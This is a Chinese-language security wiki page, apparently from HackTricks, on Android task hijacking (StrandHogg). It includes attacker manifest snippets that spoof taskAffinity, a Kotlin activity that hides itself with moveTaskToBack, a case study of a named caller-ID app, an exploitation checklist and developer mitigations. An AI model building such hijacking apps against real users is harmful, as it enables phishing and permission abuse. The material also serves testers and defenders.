# Android 任务劫持

{{#include ../../banners/hacktricks-training.md}}

## 任务、后栈和前台活动

在 Android 中，**任务** 本质上是一组用户交互以完成特定工作的活动，组织在 **后栈** 中。这个栈根据活动打开的时间对活动进行排序，最近的活动显示在顶部，称为 **前台活动**。在任何时刻，只有这个活动在屏幕上可见，使其成为 **前台任务** 的一部分。

以下是活动转换的快速概述：

- **活动 1** 开始时是前台的唯一活动。
- 启动 **活动 2** 将 **活动 1** 推入后栈，使 **活动 2** 进入前台。
- 启动 **活动 3** 将 **活动 1** 和 **活动 2** 进一步推入栈中，**活动 3** 现在在前面。
- 关闭 **活动 3** 将 **活动 2** 重新带回前台，展示了 Android 的简化任务导航机制。

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## 任务亲和力攻击

`taskAffinity` 告诉 Android 一个 `Activity` *更倾向于* 属于哪个任务。当两个活动共享相同的亲和力时，**Android 允许将它们合并到同一个后栈中，即使它们来自不同的 APK**。

如果攻击者能够将恶意活动放置在该栈的 **根** 位置，每次受害者打开合法应用程序时，恶意 UI 将是用户看到的第一件事——非常适合网络钓鱼或滥用权限请求。

攻击面比许多开发者想象的要广，因为 **每个活动自动继承与应用程序包名称相等的亲和力**（除非开发者设置 `android:taskAffinity=""`）。因此 *不采取任何行动* 已经使应用在 Android 11 之前的版本中暴露于任务劫持的风险。

### 经典的 "singleTask / StrandHogg" 场景

1. 攻击者声明一个活动：
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. 恶意应用程序启动一次，以便任务（具有伪造的亲和力）存在于最近的任务中。
3. 当用户稍后打开真实应用程序时，Android 发现已经有一个任务，其 **根亲和力与包匹配**，并将该任务带到前台。
4. 攻击者的 UI 首先显示。

### 默认亲和力（无 `singleTask`）变体 – 来电显示案例研究

在 **来电显示 (caller.id.phone.number.block)** 应用程序中报告的漏洞表明，该攻击 *也* 适用于默认的 `standard` 启动模式：

1. 攻击者应用程序创建一个假根活动并立即隐藏自己：
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // 保持任务在最近任务中但不在视野中
}
}
```
2. 清单只需将受害者包复制到 `taskAffinity` 中：
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. 一旦用户安装并打开恶意应用程序 **一次**，一个亲和力等于受害者包的任务就存在（但在后台）。
4. 当真实的来电显示应用程序启动时，Android 重新使用该任务并将 `HackActivity` 带到前台 → 网络钓鱼窗口/权限滥用。

> 注意：从 **Android 11 (API 30)** 开始，系统默认不将不属于同一 UID 的两个包放入同一任务，从而减轻了这一特定变体。旧版本仍然易受攻击。

---

## 检测与利用清单

1. 从目标 APK 中提取 `AndroidManifest.xml`，检查每个 `<activity>`（或全局 `<application>` 元素）是否包含 `android:taskAffinity=""`（空） **或** 自定义值。
2. 如果没有，制作一个恶意应用：
- `android:taskAffinity` = 受害者包名。
- 提供一个 `MAIN/LAUNCHER` 意图，以便用户可以打开一次。
- 可选地调用 `moveTaskToBack(true)` 以立即隐藏。
3. 让受害者打开他们的合法应用程序 → 劫持。

## 缓解

开发者应：

* 在 `<application>` 级别明确设置 `android:taskAffinity=""`（推荐） **或** 为每个活动提供一个唯一的、私有的亲和力。
* 对于高度敏感的屏幕，将上述内容与 `android:launchMode="singleInstance"` 或现代 [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode) 保护结合使用。
* 升级应用的 `targetSdkVersion` 并强制执行 **Android 11** 行为变化，其中任务默认不跨包共享。

---

## 参考文献

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)

{{#include ../../banners/hacktricks-training.md}}
